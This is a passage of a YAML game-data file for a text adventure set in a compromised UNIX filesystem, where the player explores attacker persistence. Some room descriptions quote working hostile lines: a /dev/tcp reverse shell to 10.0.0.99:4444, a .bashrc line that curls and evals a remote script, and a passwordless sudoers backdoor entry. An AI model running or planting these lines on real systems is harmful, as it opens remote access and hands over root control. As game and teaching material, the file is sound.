title: "The UNIX Catacombs"
starting_room: login_terminal
death: respawn

# =============================================================================
# ROOMS — Phase 1: ~100 rooms across localhost core filesystem
# =============================================================================

rooms:

  # ===========================================================================
  # / (root) — the entry point
  # ===========================================================================

  login_terminal:
    name: "Login Prompt"
    description_seed: "A green phosphor terminal flickers in the darkness. The cursor blinks steadily. UNIX System V — Catacomb Edition. You are a process, newly spawned, standing before the system's login gate. A crumpled man page lies on the floor. The filesystem stretches south."
    connections:
      south: {room: root_fs, type: open}
    items: [man_page]

  root_fs:
    name: "/ (root)"
    description_seed: "The root of the filesystem. All paths begin and end here. Corridors branch in every direction — the skeleton of a UNIX system laid bare. The air smells of silicon and old documentation. Something is wrong. Faint traces of unauthorized access mar the walls."
    connections:
      north: {room: login_terminal, type: open}
      south: {room: home, type: open}
      east: {room: var, type: open}
      west: {room: usr, type: open}
      up: {room: proc, type: open}
      down: {room: dev, type: open}

  # ===========================================================================
  # /boot — system startup
  # ===========================================================================

  boot:
    name: "/boot"
    description_seed: "The cold chamber where the system begins. A massive GRUB menu etched in stone dominates the north wall — boot entries, kernel versions, fallback options. Most entries are dusty. One has been recently modified."
    connections:
      south: {room: root_fs, type: open}
      east: {room: boot_grub, type: open}
      west: {room: boot_kernel, type: open}

  boot_grub:
    name: "/boot/grub"
    description_seed: "GRUB configuration files line the walls like ancient scrolls. grub.cfg, its entries readable if you squint. Someone added a boot entry that drops to a root shell without authentication. A classic persistence trick."
    connections:
      west: {room: boot, type: open}
    items: [grub_config]

  boot_kernel:
    name: "/boot/vmlinuz"
    description_seed: "The kernel image rests here — a compressed monolith of compiled logic. An initrd image sits beside it. Both are signed. The signatures check out. At least the kernel hasn't been tampered with. Yet."
    connections:
      east: {room: boot, type: open}

  # ===========================================================================
  # /etc — system configuration (15 rooms)
  # ===========================================================================

  etc:
    name: "/etc"
    description_seed: "The library of the system. Configuration files in every alcove — passwd, fstab, hosts, resolv.conf. The beating heart of system identity. Some files have been recently modified. Timestamps don't match the change log."
    connections:
      north: {room: root_fs, type: open}
      south: {room: etc_ssh, type: open}
      east: {room: etc_cron_d, type: open}
      west: {room: etc_pam_d, type: open}
      up: {room: etc_shadow, type: open}
      down: {room: etc_systemd, type: open}

  etc_shadow:
    name: "/etc/shadow"
    description_seed: "The vault of secrets. Password hashes line the walls like ancient runes — SHA-512, bcrypt, the occasional horrifying MD5. One entry catches your eye: a new user 'backdoor' with a known weak hash. Someone has been here."
    connections:
      down: {room: etc, type: open}
    items: [shadow_file]

  etc_passwd:
    name: "/etc/passwd"
    description_seed: "User accounts etched in stone. root:x:0:0, daemon:x:1:1, the usual suspects. But at the bottom — a user named 'backdoor' with UID 0. A root-equivalent account, hiding in plain sight."
    connections:
      south: {room: etc, type: open}

  etc_ssh:
    name: "/etc/ssh"
    description_seed: "The SSH server configuration chamber. sshd_config hangs on the wall, its settings exposed. PermitRootLogin is set to 'yes'. PasswordAuthentication is 'yes'. The authorized_keys file has been modified — there's a key here that doesn't belong."
    connections:
      north: {room: etc, type: open}
      east: {room: etc_ssh_keys, type: open}

  etc_ssh_keys:
    name: "/etc/ssh/authorized_keys"
    description_seed: "A ring of SSH public keys. Most are legitimate — admin, dev, backup. One key has a comment: 'persistence@c2.darknet.onion'. The attacker's key, granting permanent access. It should be removed."
    connections:
      west: {room: etc_ssh, type: open}
    items: [rogue_ssh_key]

  etc_cron_d:
    name: "/etc/cron.d"
    description_seed: "Scheduled tasks tick like clockwork. Logrotate, certbot renewal, backup scripts — all normal. But one crontab entry runs every 5 minutes: a curl command that phones home to an external server. A Cron Backdoor process guards it jealously."
    connections:
      west: {room: etc, type: open}
      south: {room: etc_cron_daily, type: open}
    enemies: [cron_backdoor]

  etc_cron_daily:
    name: "/etc/cron.daily"
    description_seed: "Daily maintenance scripts. Logrotate, man-db, apt. One script has been modified — it downloads and executes a payload from a remote URL before running the legitimate task. Subtle. Effective."
    connections:
      north: {room: etc_cron_d, type: open}

  etc_pam_d:
    name: "/etc/pam.d"
    description_seed: "The authentication gauntlet. PAM modules stacked like checkpoints — pam_unix, pam_deny, pam_permit. The chain is intact, mostly. But pam_rootok has been added to su — any user can su to root without a password."
    connections:
      east: {room: etc, type: open}
      south: {room: etc_sudoers, type: open}
    items: [sudo_token]

  etc_sudoers:
    name: "/etc/sudoers"
    description_seed: "The sudoers file, etched in immutable stone. Well, supposedly immutable. Someone added 'backdoor ALL=(ALL) NOPASSWD: ALL'. Full sudo access, no password required. visudo weeps."
    connections:
      north: {room: etc_pam_d, type: open}

  etc_systemd:
    name: "/etc/systemd/system"
    description_seed: "Systemd unit files arranged in orderly rows. Services, timers, sockets. Most are standard — sshd.service, nginx.service, cron.service. One service file stands out: 'update-helper.service'. It starts a reverse shell on boot."
    connections:
      up: {room: etc, type: open}
      east: {room: etc_systemd_services, type: open}

  etc_systemd_services:
    name: "/etc/systemd/system (services)"
    description_seed: "More service units. The 'update-helper.service' file is here in full — ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.99/4444 0>&1'. A textbook reverse shell. Enabled and running."
    connections:
      west: {room: etc_systemd, type: open}

  etc_nginx:
    name: "/etc/nginx"
    description_seed: "The web server configuration. nginx.conf, sites-available, sites-enabled. The main config looks clean, but sites-enabled has a suspicious server block listening on port 8443 — proxying to an internal service that shouldn't be exposed."
    connections:
      south: {room: etc, type: open}
      east: {room: etc_nginx_sites, type: open}

  etc_nginx_sites:
    name: "/etc/nginx/sites-enabled"
    description_seed: "Symlinks to site configurations. The default site serves static files. The suspicious site on 8443 proxies to localhost:9999 — an unauthenticated admin panel for the legacy application in /opt."
    connections:
      west: {room: etc_nginx, type: open}

  etc_iptables:
    name: "/etc/iptables"
    description_seed: "The firewall ruleset. Or what's left of it. INPUT chain: ACCEPT all. FORWARD chain: ACCEPT all. OUTPUT chain: ACCEPT all. Every rule has been flushed. The system is wide open. An Iptables Shield lies broken on the floor."
    connections:
      north: {room: etc, type: open}
    items: [iptables_shield]

  # ===========================================================================
  # /home — user directories (12 rooms)
  # ===========================================================================

  home:
    name: "/home"
    description_seed: "User home directories branch from this corridor. Four doors: guest (open), admin (locked with a sturdy padlock), dev (ajar), and a hidden door barely visible in the shadows."
    connections:
      north: {room: root_fs, type: open}
      south: {room: home_guest, type: open}
      east: {room: home_admin, type: locked}
      west: {room: home_dev, type: open}

  home_guest:
    name: "/home/guest"
    description_seed: "A sparse home directory. Your home. A .bashrc file glows faintly. Directories branch to .ssh and Desktop. An Alias Shield hangs on the wall — sourced from .bashrc, it deflects the worst of incoming signals."
    connections:
      north: {room: home, type: open}
      east: {room: home_guest_ssh, type: open}
      south: {room: home_guest_desktop, type: open}
      west: {room: home_guest_bashrc, type: open}
    items: [alias_shield]

  home_guest_ssh:
    name: "/home/guest/.ssh"
    description_seed: "Your SSH directory. A keypair — id_rsa and id_rsa.pub. The key is only authorized on this machine. known_hosts lists several servers you've connected to before. The fingerprints match... mostly."
    connections:
      west: {room: home_guest, type: open}

  home_guest_bashrc:
    name: "/home/guest/.bashrc"
    description_seed: "Your shell configuration. Aliases, PATH settings, a PS1 prompt with colors. Everything looks normal. But at the bottom — a line you didn't add: 'eval $(curl -s http://10.0.0.99/init.sh)'. It runs every time you open a shell."
    connections:
      east: {room: home_guest, type: open}

  home_guest_desktop:
    name: "/home/guest/Desktop"
    description_seed: "A cluttered desktop. README files, old scripts, a half-finished report. One file stands out — 'URGENT_security_notice.txt'. It warns about suspicious activity detected by the monitoring system three days ago. Nobody responded."
    connections:
      north: {room: home_guest, type: open}
    items: [security_notice]

  home_admin:
    name: "/home/admin"
    description_seed: "The administrator's home directory. Neat, organized. Scripts in ~/scripts, documentation in ~/docs. The .ssh directory to the east holds keys to other systems. A firewall config draft sits on the desk."
    connections:
      west: {room: home, type: open}
      east: {room: home_admin_ssh, type: open}
      south: {room: home_admin_scripts, type: open}

  home_admin_ssh:
    name: "/home/admin/.ssh"
    description_seed: "The admin's SSH keys. Several keypairs, each labeled: webserver, database, monitoring. The webserver key is what you need to investigate the compromised web server."
    connections:
      west: {room: home_admin, type: open}
    items: [admin_ssh_key]

  home_admin_scripts:
    name: "/home/admin/scripts"
    description_seed: "Admin maintenance scripts. backup.sh, deploy.sh, incident-response.sh. The incident response script is thorough — it collects logs, checksums binaries, and checks for known indicators of compromise. Useful reading."
    connections:
      north: {room: home_admin, type: open}
    items: [ir_script]

  home_dev:
    name: "/home/dev"
    description_seed: "The developer's workspace. Source code repositories, build scripts, Docker configs. The dev was working on the legacy app in /opt. Their .ssh directory holds a key to the build server."
    connections:
      east: {room: home, type: open}
      south: {room: home_dev_ssh, type: open}
      west: {room: home_dev_src, type: open}

  home_dev_ssh:
    name: "/home/dev/.ssh"
    description_seed: "The developer's SSH keys. One keypair labeled 'buildserver'. The private key is unencrypted — no passphrase. Convenient for CI/CD. Convenient for attackers too."
    connections:
      north: {room: home_dev, type: open}
    items: [dev_ssh_key]

  home_dev_src:
    name: "/home/dev/src"
    description_seed: "Source code for the legacy application. Java, Spring Boot, Maven. The pom.xml has a dependency on a library that was compromised six months ago. The dev never updated it."
    connections:
      east: {room: home_dev, type: open}

  home_attacker:
    name: "/home/.hidden"
    description_seed: "A hidden directory. Not visible in a normal ls — only with ls -la. Inside: a toolkit. Nmap output, credential dumps, pivot scripts. The attacker staged their entire operation from here. A timestamp shows they first accessed the system 72 hours ago."
    connections:
      north: {room: home, type: hidden}
    enemies: [rogue_ssh_agent]
    items: [attacker_notes]

  # ===========================================================================
  # /tmp — temporary storage (9 rooms)
  # ===========================================================================

  tmp:
    name: "/tmp"
    description_seed: "The temporary filesystem. A chaotic landscape of abandoned files, orphaned sockets, and stale lock files. The world-writable permissions make this a favorite staging ground for attackers. Paths lead in several directions."
    connections:
      north: {room: root_fs, type: open}
      south: {room: tmp_wasteland, type: open}
      east: {room: tmp_sockets, type: open}
      west: {room: tmp_hidden, type: hidden}

  tmp_wasteland:
    name: "/tmp (wasteland)"
    description_seed: "The deepest part of /tmp. Half-finished downloads, core dumps, compiler temporaries. A Segfault Daemon shambles between the debris, corrupting everything it touches. A pipe connector juts from the ground."
    connections:
      north: {room: tmp, type: open}
      south: {room: tmp_pipes, type: open}
      east: {room: tmp_locks, type: open}
    enemies: [segfault_daemon]
    items: [pipe_connector]

  tmp_locks:
    name: "/tmp (lock files)"
    description_seed: "A graveyard of stale lock files. .lock, .pid, .lck — processes long dead but their locks remain, blocking anything that tries to use the same resource. A Stale Lock entity clings to a particularly stubborn .pid file."
    connections:
      west: {room: tmp_wasteland, type: open}
    enemies: [stale_lock]

  tmp_pipes:
    name: "/tmp (pipe junction)"
    description_seed: "A nexus of UNIX pipes. Named pipes, anonymous pipes, FIFOs — data streams flow in every direction. Some pipes loop back on themselves. One leads south to /dev. The pipe maze is disorienting but navigable."
    connections:
      north: {room: tmp_wasteland, type: open}
      south: {room: dev, type: open}
      east: {room: tmp_pipe_maze_1, type: open}

  tmp_pipe_maze_1:
    name: "Pipe Maze (east branch)"
    description_seed: "Inside a network of UNIX pipes. Data flows past you in both directions. This branch connects to another junction. The walls are slick with buffered output."
    connections:
      west: {room: tmp_pipes, type: open}
      south: {room: tmp_pipe_maze_2, type: open}

  tmp_pipe_maze_2:
    name: "Pipe Maze (south branch)"
    description_seed: "The pipe narrows. You can hear data being consumed ahead — a process reading from the pipe. The pipe exits to the east."
    connections:
      north: {room: tmp_pipe_maze_1, type: open}
      east: {room: tmp_pipe_exit, type: open}

  tmp_pipe_exit:
    name: "Pipe Maze (exit)"
    description_seed: "The pipe widens into a chamber. A core dump sits in the corner — still warm. The process that created it crashed recently. A path leads back north to /tmp."
    connections:
      west: {room: tmp_pipe_maze_2, type: open}
      north: {room: tmp, type: open}
    items: [core_dump]

  tmp_sockets:
    name: "/tmp (sockets)"
    description_seed: "UNIX domain sockets cluster here like fungi. mysql.sock, docker.sock, X11 sockets. The docker.sock is world-readable — anyone can issue Docker commands. That's a privilege escalation waiting to happen."
    connections:
      west: {room: tmp, type: open}

  tmp_hidden:
    name: "/tmp/.hidden"
    description_seed: "A hidden directory in /tmp. The attacker's staging area. Encrypted communications logs, compiled exploits, a Metasploit payload. A Fork Bomb lurks here — a script that spawns copies of itself endlessly."
    connections:
      east: {room: tmp, type: hidden}
    enemies: [fork_bomb]
    items: [exploit_payload]

  # ===========================================================================
  # /var — variable data (14 rooms)
  # ===========================================================================

  var:
    name: "/var"
    description_seed: "Variable data — the system's memory of what has happened. Logs to the south, spools to the east, the web root to the west. The air is thick with the smell of ink and old paper — log entries printed endlessly."
    connections:
      west: {room: root_fs, type: open}
      south: {room: var_log, type: open}
      east: {room: var_spool, type: open}
      north: {room: var_run, type: open}
      down: {room: var_lib, type: open}

  var_log:
    name: "/var/log"
    description_seed: "Walls of scrolling text — syslog, auth.log, kern.log, daemon.log. Most are noise, but patterns emerge if you look carefully. A Grep Tool hangs on the wall in a glass case labeled 'Break in case of emergency.'"
    connections:
      north: {room: var, type: open}
      south: {room: var_log_auth, type: open}
      east: {room: var_log_syslog, type: open}
      west: {room: var_log_kern, type: open}
    items: [grep_tool]

  var_log_auth:
    name: "/var/log/auth.log"
    description_seed: "Authentication logs. Failed login attempts scroll past — hundreds of them. Brute force attacks from multiple IPs. Then: 'Accepted publickey for backdoor from 10.0.0.99'. The attacker got in three days ago. A Log Rotator enemy patrols here, trying to destroy the evidence."
    connections:
      north: {room: var_log, type: open}
    enemies: [log_rotator]

  var_log_syslog:
    name: "/var/log/syslog"
    description_seed: "The system log. Kernel messages, service starts and stops, cron jobs firing. Deep in the log: 'update-helper.service: Main process exited, code=exited, status=0/SUCCESS' — the reverse shell service, starting every boot."
    connections:
      west: {room: var_log, type: open}

  var_log_kern:
    name: "/var/log/kern.log"
    description_seed: "Kernel messages. Hardware detection, module loading, the occasional oops. One entry stands out: a kernel module was loaded from /tmp — 'rootkit.ko'. The rootkit is already in the kernel."
    connections:
      east: {room: var_log, type: open}

  var_log_nginx:
    name: "/var/log/nginx"
    description_seed: "Nginx access and error logs. Thousands of requests. Most are normal web traffic. But the access log shows POST requests to /admin/upload.php — a web shell being accessed repeatedly from the same IP."
    connections:
      north: {room: var_log, type: open}

  var_spool:
    name: "/var/spool"
    description_seed: "The spool directory. Mail queues, print queues, cron output. Undelivered mail piles up — bounce messages, cron output nobody reads. The mail queue has outbound messages to addresses that look like C2 domains."
    connections:
      west: {room: var, type: open}
      south: {room: var_spool_mail, type: open}

  var_spool_mail:
    name: "/var/spool/mail"
    description_seed: "Mailboxes for system users. Root's mailbox is overflowing with cron output and logwatch reports. One message is from the monitoring system: 'CRITICAL: Outbound connection to known C2 IP detected.' Sent three days ago. Unread."
    connections:
      north: {room: var_spool, type: open}

  var_run:
    name: "/var/run"
    description_seed: "PID files and runtime data. sshd.pid, nginx.pid, cron.pid — all the running services. One PID file doesn't match any known service: 'update-helper.pid'. The reverse shell is running."
    connections:
      south: {room: var, type: open}

  var_lib:
    name: "/var/lib"
    description_seed: "Persistent state for services. dpkg status, apt lists, MySQL databases. The dpkg database shows packages were installed recently — netcat, socat, nmap. Tools an attacker would need. A Core Dump sits in the corner."
    connections:
      up: {room: var, type: open}
      east: {room: var_lib_mysql, type: open}
    items: [core_dump_2]

  var_lib_mysql:
    name: "/var/lib/mysql"
    description_seed: "MySQL data directory. Database files, binary logs, the ibdata tablespace. The binary log shows queries: 'SELECT * FROM users WHERE 1=1' — the entire users table was dumped. Data exfiltration."
    connections:
      west: {room: var_lib, type: open}

  var_www:
    name: "/var/www/html"
    description_seed: "The web root. Static HTML files, a WordPress installation, and... upload.php. A web shell. Simple PHP: accepts POST data and passes it to system(). The attacker has been executing commands through the web server."
    connections:
      north: {room: var, type: open}
    items: [web_shell_evidence]

  # ===========================================================================
  # /usr — user programs (14 rooms)
  # ===========================================================================

  usr:
    name: "/usr"
    description_seed: "User programs and libraries. The arsenal of the system — every tool, every binary, every shared library. Some of these tools have been tampered with. Trust nothing."
    connections:
      east: {room: root_fs, type: open}
      south: {room: usr_bin, type: open}
      west: {room: usr_sbin, type: open}
      down: {room: usr_lib, type: open}
      north: {room: usr_local, type: open}

  usr_bin:
    name: "/usr/bin"
    description_seed: "Standard user binaries. ls, cat, grep, find, awk — the everyday tools. But checksums don't match for three binaries: ls, ps, and netstat. They've been replaced with trojaned versions that hide the attacker's files and processes."
    connections:
      north: {room: usr, type: open}
      east: {room: usr_bin_ls, type: open}
      south: {room: usr_bin_ps, type: open}
      west: {room: usr_bin_netstat, type: open}

  usr_bin_ls:
    name: "/usr/bin/ls (trojaned)"
    description_seed: "The ls binary. It looks normal, but it's been modified. This version filters out any file matching patterns: '.hidden', 'update-helper', 'rootkit'. The real ls is backed up at /usr/bin/.ls.bak. A Trojan Binary guards it."
    connections:
      west: {room: usr_bin, type: open}
    enemies: [trojan_binary]
    items: [real_ls]

  usr_bin_ps:
    name: "/usr/bin/ps (trojaned)"
    description_seed: "The ps binary. Modified to hide processes owned by the 'backdoor' user. Running the real ps from /usr/bin/.ps.bak reveals three hidden processes: a reverse shell, a cryptocurrency miner, and a port scanner."
    connections:
      north: {room: usr_bin, type: open}

  usr_bin_netstat:
    name: "/usr/bin/netstat (trojaned)"
    description_seed: "The netstat binary. This version hides connections to 10.0.0.99 (the C2 server). The real netstat shows an established connection on port 4444 — the reverse shell phoning home."
    connections:
      east: {room: usr_bin, type: open}

  usr_sbin:
    name: "/usr/sbin"
    description_seed: "System administration binaries. sshd, nginx, cron, iptables, useradd. The heavy artillery of system management. A Chroot Jail sits in the corner — portable isolation."
    connections:
      east: {room: usr, type: open}
      south: {room: usr_sbin_tools, type: open}
    items: [chroot_jail]

  usr_sbin_tools:
    name: "/usr/sbin (tools)"
    description_seed: "More system tools. tcpdump for packet capture, strace for system call tracing, lsof for open files. The strace blade glows faintly — a weapon that exposes process internals."
    connections:
      north: {room: usr_sbin, type: open}
    items: [strace_blade]

  usr_lib:
    name: "/usr/lib"
    description_seed: "Shared libraries. libc, libssl, libpthread — the foundations everything is built on. Something is wrong. libpam_unix.so has been modified — the authentication library. A Rootkit hides among the legitimate libraries, invisible until you know where to look."
    connections:
      up: {room: usr, type: open}
      east: {room: usr_lib_modules, type: open}
    enemies: [rootkit]

  usr_lib_modules:
    name: "/usr/lib/modules"
    description_seed: "Kernel modules. Network drivers, filesystem drivers, crypto modules. A module named 'rootkit.ko' is loaded — it hooks system calls to hide files and processes at the kernel level. The Grep Tool can reveal its hooks."
    connections:
      west: {room: usr_lib, type: open}

  usr_local:
    name: "/usr/local"
    description_seed: "Locally installed software. Not managed by the package manager — manually compiled and installed. A GDB Debugger sits here, powerful but heavy. Several custom scripts in /usr/local/bin."
    connections:
      south: {room: usr, type: open}
      east: {room: usr_local_bin, type: open}
    items: [gdb_debugger]

  usr_local_bin:
    name: "/usr/local/bin"
    description_seed: "Custom binaries. Monitoring scripts, deployment tools, helper utilities. One binary stands out — 'update-helper'. The reverse shell payload. It was installed here to survive package updates."
    connections:
      west: {room: usr_local, type: open}

  # ===========================================================================
  # /dev — device files (8 rooms)
  # ===========================================================================

  dev:
    name: "/dev"
    description_seed: "Device files. The interface between software and hardware. Special files that represent everything from disks to terminals to the void itself. The air hums with I/O."
    connections:
      up: {room: root_fs, type: open}
      south: {room: dev_null, type: open}
      east: {room: dev_pts, type: open}
      west: {room: dev_random, type: open}
      north: {room: tmp_pipes, type: open}
      down: {room: dev_sda, type: open}

  dev_null:
    name: "/dev/null"
    description_seed: "The void. Absolute nothing. Data enters and is destroyed — no trace, no recovery, no mercy. The Null Byte lives here, an entity of pure negation. It absorbs everything and returns nothing. The ultimate garbage collector."
    connections:
      north: {room: dev, type: open}
    enemies: [null_byte]

  dev_zero:
    name: "/dev/zero"
    description_seed: "An infinite stream of zeros. Peaceful. Meditative. The opposite of /dev/null — instead of destroying, it creates. An endless supply of nothing, paradoxically restorative. Rest here and your processes stabilize. An Entropy Potion bubbles from a spring."
    connections:
      east: {room: dev, type: open}
    items: [entropy_potion]

  dev_random:
    name: "/dev/random"
    description_seed: "The entropy pool. Randomness harvested from hardware interrupts, mouse movements, keyboard timing. The pool is shallow — entropy is precious. An Entropy Potion has crystallized from the accumulated randomness."
    connections:
      east: {room: dev, type: open}
      south: {room: dev_zero, type: open}
    items: [entropy_potion_2]

  dev_pts:
    name: "/dev/pts"
    description_seed: "Pseudo-terminal devices. Each one represents an active terminal session — SSH connections, tmux panes, screen windows. Four terminals are active. Three are legitimate. One belongs to the attacker. A Rogue SSH Agent lurks among the terminals."
    connections:
      west: {room: dev, type: open}
      south: {room: dev_pts_3, type: open}
    enemies: [rogue_ssh_agent_2]

  dev_pts_3:
    name: "/dev/pts/3 (rogue session)"
    description_seed: "The attacker's terminal session. Commands scroll past: whoami, id, cat /etc/shadow, scp... They've been active. The session is still open. The connection traces back to 10.0.0.99."
    connections:
      north: {room: dev_pts, type: open}

  dev_sda:
    name: "/dev/sda"
    description_seed: "The primary disk device. Raw block access to the system's storage. Partitions branch from here — sda1 (boot), sda2 (root), sda3 (swap). Reading raw blocks can reveal deleted files the attacker tried to hide."
    connections:
      up: {room: dev, type: open}
      east: {room: dev_sda2, type: open}

  dev_sda2:
    name: "/dev/sda2 (root partition)"
    description_seed: "The root partition's raw blocks. Beneath the filesystem abstraction, data is just bytes on a platter. Deleted files leave ghosts here — fragments of the attacker's tools that rm couldn't fully erase."
    connections:
      west: {room: dev_sda, type: open}

  # ===========================================================================
  # /proc — process information (9 rooms)
  # ===========================================================================

  proc:
    name: "/proc"
    description_seed: "The process filesystem. Not a real filesystem — a window into the running kernel. Every process has a directory here. Every kernel parameter is tunable. The system's vital signs are readable from these walls."
    connections:
      down: {room: root_fs, type: open}
      south: {room: proc_1, type: open}
      east: {room: proc_self, type: open}
      west: {room: proc_net, type: open}
      north: {room: proc_sys, type: open}

  proc_1:
    name: "/proc/1 (init)"
    description_seed: "PID 1 — systemd, the mother of all processes. The first process spawned at boot, the last to die at shutdown. Its cgroup tree shows every running service. The process tree reveals the hierarchy of the system."
    connections:
      north: {room: proc, type: open}
      east: {room: proc_1_status, type: open}

  proc_1_status:
    name: "/proc/1/status"
    description_seed: "The status of PID 1. Running as root. Memory usage nominal. Threads: 1. The process is healthy. But its child processes include some suspicious entries — PIDs that don't correspond to any known service."
    connections:
      west: {room: proc_1, type: open}

  proc_self:
    name: "/proc/self"
    description_seed: "Your own process. PID, memory maps, file descriptors, environment variables. You can see yourself reflected in the proc filesystem. Your environment contains the PATH, HOME, and — oddly — a variable called C2_CALLBACK_URL. That's not yours."
    connections:
      west: {room: proc, type: open}

  proc_net:
    name: "/proc/net"
    description_seed: "Network statistics. TCP connections, UDP listeners, routing tables. The tcp file shows established connections — and there it is: a connection to 10.0.0.99:4444 owned by the 'backdoor' user. The reverse shell, in plain sight."
    connections:
      east: {room: proc, type: open}
      south: {room: proc_net_route, type: open}

  proc_net_route:
    name: "/proc/net/route"
    description_seed: "The routing table. Default gateway, local subnets, and — a route that shouldn't be there. Traffic to 10.0.0.0/24 is being routed through a tunnel interface. The attacker set up a VPN tunnel for persistent access."
    connections:
      north: {room: proc_net, type: open}

  proc_sys:
    name: "/proc/sys"
    description_seed: "Kernel tunable parameters. ip_forward, tcp_syncookies, randomize_va_space. Some of these have been changed — ip_forward is enabled (this machine is routing traffic), ASLR is disabled. The OOM Killer patrols this area, ready to reap any process that uses too much memory."
    connections:
      south: {room: proc, type: open}
      east: {room: proc_sys_kernel, type: open}
    enemies: [oom_killer]

  proc_sys_kernel:
    name: "/proc/sys/kernel"
    description_seed: "Deep kernel parameters. hostname, panic, modules_disabled. The Kernel Panic boss guards this chamber — a catastrophic failure entity that can freeze the entire system. Defeating it stabilizes the kernel and lets you disable module loading."
    connections:
      west: {room: proc_sys, type: open}
    enemies: [kernel_panic]

  proc_rogue:
    name: "/proc/[rogue PIDs]"
    description_seed: "Process directories for PIDs that don't belong to any legitimate service. A cryptocurrency miner, a port scanner, and the reverse shell — all running under the 'backdoor' user. Zombie Processes shamble between the directories."
    connections:
      south: {room: proc, type: open}
    enemies: [zombie_process, zombie_process_2]

  # ===========================================================================
  # /opt — third-party software (6 rooms)
  # ===========================================================================

  opt:
    name: "/opt"
    description_seed: "Third-party software. Not part of the base system — installed separately, maintained separately, often forgotten. A legacy Java application lives here, running on an ancient version of Tomcat."
    connections:
      east: {room: root_fs, type: open}
      south: {room: opt_legacy, type: open}
      west: {room: opt_monitoring, type: open}

  opt_legacy:
    name: "/opt/legacy-app"
    description_seed: "The legacy application. Java 8, Spring Boot 1.x, Tomcat 7. Known CVEs: 47. Patches applied: 0. The application has an unauthenticated admin panel exposed through nginx on port 8443. This was the initial entry point."
    connections:
      north: {room: opt, type: open}
      east: {room: opt_legacy_logs, type: open}
      south: {room: opt_legacy_webinf, type: open}

  opt_legacy_logs:
    name: "/opt/legacy-app/logs"
    description_seed: "Application logs. Stack traces, SQL queries, HTTP requests. The logs show the attacker exploited a deserialization vulnerability — a crafted Java object that executes arbitrary code when deserialized."
    connections:
      west: {room: opt_legacy, type: open}

  opt_legacy_webinf:
    name: "/opt/legacy-app/WEB-INF"
    description_seed: "The web application's internal configuration. web.xml, application.properties, compiled classes. The application.properties file contains database credentials in plaintext. The same credentials work for the MySQL database."
    connections:
      north: {room: opt_legacy, type: open}
    items: [db_credentials]

  opt_monitoring:
    name: "/opt/monitoring"
    description_seed: "The monitoring stack. Prometheus, Grafana, Alertmanager. All running, all collecting data, all alerting. The alerts have been firing for 72 hours. 'High CPU usage', 'Unusual outbound traffic', 'New user account created'. All unread. All ignored."
    connections:
      east: {room: opt, type: open}

  # ===========================================================================
  # /srv and /mnt — service data and mounts (4 rooms)
  # ===========================================================================

  srv:
    name: "/srv"
    description_seed: "Service data. Git repositories and Docker volumes. The git repos contain source code with hardcoded secrets. The Docker socket is world-readable — container escape is trivial."
    connections:
      north: {room: root_fs, type: open}
      east: {room: srv_git, type: open}
      west: {room: srv_docker, type: open}

  srv_git:
    name: "/srv/git"
    description_seed: "Bare git repositories. The application source code, deployment scripts, infrastructure-as-code. A git log shows the attacker committed a backdoor to the deployment script — it runs on every deploy."
    connections:
      west: {room: srv, type: open}

  srv_docker:
    name: "/srv/docker"
    description_seed: "Docker volumes and configuration. The docker.sock is world-readable. Container images include one labeled 'miner' — a cryptocurrency mining container that starts automatically. A Container Shell sits unused."
    connections:
      east: {room: srv, type: open}
    items: [container_shell]

  # ===========================================================================
  # /root — root's home (5 rooms, locked until sudo_token obtained)
  # ===========================================================================

  root_home:
    name: "/root"
    description_seed: "Root's home directory. The inner sanctum. Clean, sparse, powerful. A Chmod Hammer hangs above the desk — the root user's weapon of choice. .ssh holds keys to every server on the network. The Daemon King stands guard."
    connections:
      north: {room: root_fs, type: locked}
      east: {room: root_ssh, type: open}
      south: {room: root_scripts, type: open}
    enemies: [daemon_king]
    items: [chmod_hammer]

  root_ssh:
    name: "/root/.ssh"
    description_seed: "Root's SSH keys. The master keys. authorized_keys, known_hosts, and private keys for every server in the infrastructure. The root SSH key unlocks the database server."
    connections:
      west: {room: root_home, type: open}
    items: [root_ssh_key]

  root_scripts:
    name: "/root/scripts"
    description_seed: "Root's administrative scripts. Backup, restore, nuke-from-orbit. The incident response script is more thorough than admin's version. A 'hardening.sh' script would fix most of the system's vulnerabilities if run."
    connections:
      north: {room: root_home, type: open}
    items: [hardening_script]

  root_bashrc:
    name: "/root/.bashrc"
    description_seed: "Root's shell configuration. Unlike guest's .bashrc, this one is clean — no injected commands. The PATH includes /usr/local/sbin, /usr/sbin, /sbin. Proper root paths."
    connections:
      east: {room: root_home, type: open}

  root_shell_room:
    name: "The Root Shell"
    description_seed: "The Root Shell glows before you — root@catacombs:~# — Welcome, superuser. The system bends to your will. With root access and the hardening script, you can secure this system. But the attackers are still out there, on other hosts."
    connections:
      north: {room: root_home, type: open}
    items: [root_shell]

  # ===========================================================================
  # /sys — kernel sysfs interface (15 rooms)
  # ===========================================================================

  sys:
    name: "/sys"
    description_seed: "The sysfs virtual filesystem. A structured view into the kernel's device model. Every bus, every device, every driver is represented here as a directory tree. Unlike /proc's chaotic dump, /sys is orderly — almost clinically so."
    connections:
      south: {room: root_fs, type: open}
      east: {room: sys_class, type: open}
      west: {room: sys_block, type: open}
      north: {room: sys_kernel, type: open}

  sys_class:
    name: "/sys/class"
    description_seed: "Device classes. net/, block/, input/, tty/ — each contains symlinks to device instances. The organization is elegant. Every piece of hardware has an address here."
    connections:
      west: {room: sys, type: open}
      east: {room: sys_class_net, type: open}
      south: {room: sys_class_input, type: open}

  sys_class_net:
    name: "/sys/class/net"
    description_seed: "Network interfaces. eth0, lo, tun0, docker0. Each directory reveals interface state — operstate, speed, mtu, statistics. The tun0 interface is active — the attacker's VPN tunnel. It wasn't here before the compromise."
    connections:
      west: {room: sys_class, type: open}
      south: {room: sys_class_net_eth0, type: open}

  sys_class_net_eth0:
    name: "/sys/class/net/eth0"
    description_seed: "The primary ethernet interface. operstate: up. speed: 1000. carrier: 1. Statistics show unusual traffic patterns — outbound bytes far exceed inbound. Data is being exfiltrated."
    connections:
      north: {room: sys_class_net, type: open}

  sys_class_net_tun0:
    name: "/sys/class/net/tun0"
    description_seed: "The attacker's tunnel interface. A VPN connection to 10.0.0.99. Created by the reverse shell service. Traffic destined for the attacker's subnet is routed through here. Destroying this interface would cut one access path."
    connections:
      north: {room: sys_class_net, type: open}

  sys_class_input:
    name: "/sys/class/input"
    description_seed: "Input devices. Keyboard, mouse, power button. A keylogger module has registered an additional input device — 'event99'. It captures every keystroke and writes to /tmp/.hidden/keylog."
    connections:
      north: {room: sys_class, type: open}

  sys_block:
    name: "/sys/block"
